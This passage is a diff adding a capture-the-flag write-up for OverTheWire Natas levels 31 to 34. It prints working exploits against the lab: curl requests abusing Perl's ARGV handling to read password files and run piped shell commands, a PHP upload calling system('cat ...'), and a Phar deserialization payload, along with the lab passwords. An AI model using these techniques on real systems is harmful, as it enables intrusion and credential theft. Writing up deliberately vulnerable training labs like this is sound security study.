@@ -2373,3 +2373,297 @@ win!<br>here is your result:<br>natas31hay7aecuungiuKaezuathuk9biin0pu1<div id="
 </body>
 </html>
 ```
+
+### natas31
+
+```php
+my $cgi = CGI->new;
+if ($cgi->upload('file')) {
+    my $file = $cgi->param('file');
+    print '<table class="sortable table table-hover table-striped">';
+    $i=0;
+    while (<$file>) {
+        my @elements=split /,/, $_;
+
+        if($i==0){ # header
+            print "<tr>";
+            foreach(@elements){
+                print "<th>".$cgi->escapeHTML($_)."</th>";   
+            }
+            print "</tr>";
+        }
+        else{ # table content
+            print "<tr>";
+            foreach(@elements){
+                print "<td>".$cgi->escapeHTML($_)."</td>";   
+            }
+            print "</tr>";
+        }
+        $i+=1;
+    }
+    print '</table>';
+}
+else{
+print <<END;
+```
+
+Perl allows using @ARGV array as filenames by using <>. The $ARGV contains the name of the current file when reading from <>. So we can using `curl` to send payload:
+
+```shell
+curl -F "file=ARGV" -F "file=@test.csv" --user natas31:hay7aecuungiuKaezuathuk9biin0pu1 http://natas31.natas.labs.overthewire.org/index.pl?/etc/natas_webpass/natas32
+```
+
+```
+<h1>natas31</h1>
+<div id="content">
+<table class="sortable table table-hover table-striped"><tr><th>no1vohsheCaiv3ieH4em1ahchisainge
+</th></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+
+```
+
+### natas32
+
+```php
+my $cgi = CGI->new;
+if ($cgi->upload('file')) {
+    my $file = $cgi->param('file');
+    print '<table class="sortable table table-hover table-striped">';
+    $i=0;
+    while (<$file>) {
+        my @elements=split /,/, $_;
+
+        if($i==0){ # header
+            print "<tr>";
+            foreach(@elements){
+                print "<th>".$cgi->escapeHTML($_)."</th>";   
+            }
+            print "</tr>";
+        }
+        else{ # table content
+            print "<tr>";
+            foreach(@elements){
+                print "<td>".$cgi->escapeHTML($_)."</td>";   
+            }
+            print "</tr>";
+        }
+        $i+=1;
+    }
+    print '</table>';
+}
+else{
+print <<END;
+```
+
+The source code same as natas31, but we need change the payload a little bit:
+
+```shell
+curl -F "file=ARGV" -F "file=@test.csv" --user natas32:no1vohsheCaiv3ieH4em1ahchisainge "http://natas32.natas.labs.overthewire.org/index.pl?ls%20.%20|"
+```
+
+```
+<h1>natas32</h1>
+<div id="content">
+<table class="sortable table table-hover table-striped"><tr><th>.:
+</th></tr><tr><td>bootstrap-3.3.6-dist
+</td></tr><tr><td>getpassword
+</td></tr><tr><td>getpassword.c
+</td></tr><tr><td>getpassword.c.tmpl
+</td></tr><tr><td>index-source.html
+</td></tr><tr><td>index-source.pl
+</td></tr><tr><td>index.pl
+</td></tr><tr><td>index.pl.tmpl
+</td></tr><tr><td>jquery-1.12.3.min.js
+</td></tr><tr><td>sorttable.js
+</td></tr><tr><td>tmp
+</td></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+Then, we will use `cat` to get password:
+
+```shell
+curl -F "file=ARGV" -F "file=@test.csv" --user natas32:no1vohsheCaiv3ieH4em1ahchisainge "http://natas32.natas.labs.overthewire.org/index.pl?./getpassword%20|"
+```
+
+```
+<h1>natas32</h1>
+<div id="content">
+<table class="sortable table table-hover table-striped"><tr><th>shoogeiGa2yee3de6Aex8uaXeech5eey
+</th></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+```
+
+### natas33
+
+```php
+    <body>
+        <?php
+            // graz XeR, the first to solve it! thanks for the feedback!
+            // ~morla
+            class Executor{
+                private $filename=""; 
+                private $signature='adeafbadbabec0dedabada55ba55d00d';
+                private $init=False;
+
+                function __construct(){
+                    $this->filename=$_POST["filename"];
+                    if(filesize($_FILES['uploadedfile']['tmp_name']) > 4096) {
+                        echo "File is too big<br>";
+                    }
+                    else {
+                        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], "/natas33/upload/" . $this->filename)) {
+                            echo "The update has been uploaded to: /natas33/upload/$this->filename<br>";
+                            echo "Firmware upgrad initialised.<br>";
+                        }
+                        else{
+                            echo "There was an error uploading the file, please try again!<br>";
+                        }
+                    }
+                }
+
+                function __destruct(){
+                    // upgrade firmware at the end of this script
+
+                    // "The working directory in the script shutdown phase can be different with some SAPIs (e.g. Apache)."
+                    if(getcwd() === "/") chdir("/natas33/uploads/");
+                    if(md5_file($this->filename) == $this->signature){
+                        echo "Congratulations! Running firmware update: $this->filename <br>";
+                        passthru("php " . $this->filename);
+                    }
+                    else{
+                        echo "Failur! MD5sum mismatch!<br>";
+                    }
+                }
+            }
+        ?>
+
+        <h1>natas33</h1>
+        <div id="content">
+            <h2>Can you get it right?</h2>
+
+            <?php
+                session_start();
+                if(array_key_exists("filename", $_POST) and array_key_exists("uploadedfile",$_FILES)) {
+                    new Executor();
+                }
+            ?>
+            <form enctype="multipart/form-data" action="index.php" method="POST">
+                <input type="hidden" name="MAX_FILE_SIZE" value="4096" />
+                <input type="hidden" name="filename" value="<? echo session_id(); ?>" />
+                Upload Firmware Update:<br/>
+                <input name="uploadedfile" type="file" /><br />
+                <input type="submit" value="Upload File" />
+            </form>
+
+            <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+        </div>
+    </body>
+```
+
+In this challenge, we need to upload file RCE, but md5 checksum must be matched the value `adeafbadbabec0dedabada55ba55d00d`
+
+This is PHP Phar unserialization vulnerability, we can inject object in the metadata is loaded into the application's scope.
+
+First, we upload file `getpwd.php` to read the password of natas34:
+
+```php
+<?php //getpwd.php
+echo system('cat /etc/natas_webpass/natas34');
+>
+```
+
+Note that we need change the filename when upload to `getpwd.php`, default is PHPSESSID. We get the response:
+
+```
+The update has been uploaded to: /natas33/upload/getpwd.php
+Firmware upgrad initialised.
+/natas33/uploadFailur! MD5sum mismatch!
+Upload Firmware Update:
+```
+
+Then, we create `make_phar.php` to get Phar serialization archive, look like that:
+
+```php
+<?php //make_phar.php
+class Executor {
+    private $filename = "getpwd.php"; 
+    private $signature = True;
+    private $init = false;
+}
+$phar = new Phar("test.phar");
+$phar->startBuffering();
+$phar->addFromString("test.txt", 'test');
+$phar->setStub("<?php __HALT_COMPILER(); ?>");
+$o = new Executor();
+$phar->setMetadata($o);
+$phar->stopBuffering();
+?>
+```
+
+With `$signature=True`, the application will excute `passthru("php " . "getpwd.php");` and show the password.
+
+Run `php make_phar.php` to make phar, but it's not working:
+
+```
+PHP Fatal error:  Uncaught UnexpectedValueException: creating archive "test.phar" disabled by the php.ini setting phar.readonly in /home/ph3/Desktop/make_phar.php:7
+Stack trace:
+#0 /home/ph3/Desktop/make_phar.php(7): Phar->__construct()
+#1 {main}
+  thrown in /home/ph3/Desktop/make_phar.php on line 7
+```
+
+Try access `/etc/php/8.1/cli/php.ini` with sudo, change `phar.readonly = On` to `phar.readonly = Off` and remove semicolon at the beginning of the line, look like that:
+
+```
+[Phar]
+; https://php.net/phar.readonly
+phar.readonly = Off
+```
+
+Re-create phar by `php make_phar.php`, we get the content of `test.phar` file:
+
+```
+3c3f 7068 7020 5f5f 4841 4c54 5f43 4f4d
+5049 4c45 5228 293b 203f 3e0d 0aae 0000
+0001 0000 0011 0000 0001 0000 0000 0078
+0000 004f 3a38 3a22 4578 6563 7574 6f72
+223a 333a 7b73 3a31 383a 2200 4578 6563
+7574 6f72 0066 696c 656e 616d 6522 3b73
+3a31 303a 2267 6574 7077 642e 7068 7022
+3b73 3a31 393a 2200 4578 6563 7574 6f72
+0073 6967 6e61 7475 7265 223b 623a 313b
+733a 3134 3a22 0045 7865 6375 746f 7200
+696e 6974 223b 623a 303b 7d08 0000 0074
+6573 742e 7478 7404 0000 000f f335 6204
+0000 000c 7e7f d8a4 0100 0000 0000 0074
+6573 745b 3c34 c8f8 d68b cc7c a52a 5720
+badb 5c7f 03ee d634 1ae6 272d 52df 5543
+5f53 6f03 0000 0047 424d 42
+```
+
+Now upload file `test.phar`. Same the above, we need change the filename when upload to `test.phar`, default is PHPSESSID. We also get the response:
+
+```
+The update has been uploaded to: /natas33/upload/test.phar
+Firmware upgrad initialised.
+/natas33/uploadFailur! MD5sum mismatch!
+Upload Firmware Update:
+```
+
+Resend POST the previous request with `filename=phar://test.phar/test.txt` in Body Parameters to deserialize Phar, the application will run md5_file() function and excute code in `getpwd.php`, we get the password:
+
+```
+/natas33/uploadCongratulations! Running firmware update: getpwd.php <br>shu5ouSu6eicielahhae0mohd4ui5uig
+```
+
+### natas34
+
+Login natas34 with password: shu5ouSu6eicielahhae0mohd4ui5uig, we get the response:
+
+```
+Congratulations! You have reached the end... for now. 
+```
